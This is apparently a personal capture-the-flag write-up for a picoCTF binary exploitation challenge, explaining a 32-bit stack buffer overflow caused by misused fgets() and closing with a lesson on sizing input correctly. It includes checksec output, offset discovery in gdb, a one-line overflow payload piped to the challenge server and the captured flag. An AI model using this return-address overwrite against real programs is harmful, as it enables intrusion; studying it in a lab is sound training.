# Echo Escape 2

**Category:** binary exploitation  
**Difficulty:** medium  
**Progress:** solved

---

## Description


The developer has learned their lesson from unsafe input functions and tried to secure the program by using fgets(). Unfortunately, they didn’t use it correctly

**Files:** `vuln`, `vuln.c`  


---



## Analysis + Info Dump

#### file + checksec command
```
Arch:     ELF 32-bit LSB executable, Intel i386
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE
RPATH:    No RPATH
RUNPATH:  No RUNPATH
SYMBOLS:  77 (not stripped)
FORTIFY:  No (0 fortified / 2 fortifiable)
```

#### Info Dump
```
Inputting lots of chars kills the program
fgets writes 128 bytes of data to buf, but buf is only 32 bytes of size
```

### Vulnerability
- Buffer Overflow


### Stack Layout
```
┌──────────────────┐
│  buf[0..31]      │  +0
├──────────────────┤
│  padding         │  +32
├──────────────────┤
│  saved EBX       │  +36
├──────────────────┤
│  saved EBP       │  +40
├──────────────────┤
│  return address  │  +44
└──────────────────┘
```
return adress -> push ebp -> push ebx -> sub 0x24 (36<sub>10</sub>)
padding = 0x24 - 0x20 = 0x04 


---

## Solution


### Step 1:

```
using https://zerosum0x0.blogspot.com/2016/11/overflow-exploit-pattern-generator.html for offset
gdb vuln
run <<<Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2A
=> $ebx   : 0x41326241 ("Ab2A"?) => Offset = 36 (unimported register)
=> $ebp   : 0x62413362 ("b3Ab"?) => Offset = 40 (EBP is at Offset 40)
=> $eip   : 0x35624134 ("4Ab5"?) => Offset = 44 (overwriting of return adress (40 + 4 byte for EBP))

check with pwntools script also says offset is 44

manual calculation: lea    eax,[ebp-0x28] this is the buffer in this case it gets 0x28 = 40 bytes + 4 bytes for ebp is exactly 44

```
### Step 2 — Exploit
```
python3 -c 'import sys; sys.stdout.buffer.write(b"A"*44 + b"\x76\x92\x04\x08" + b"\n")' | nc dolphin-cove.picoctf.net 61310

This is more robust than just piping a python print to nc so I will keep using this format
```

### Step 3 — Capturing the flag

```
picoCTF{fgets_0v3rfl0w42_30f5589c}
```


<!--
---
## Exploit

```python

```
-->

---

## Learnings

- 32 bit vs 64 is important for calculating offsett manually, can either look at adress length or register names (E = 32 bit, R = 64 bit eip vs rip)
- https://zerosum0x0.blogspot.com/2016/11/overflow-exploit-pattern-generator.html or pwntools for patterns/offset. GDB seems off
- pwntools environment does not work in shared folder
- fgets() should be fed sizeof() instead of a manually calculated size to be secure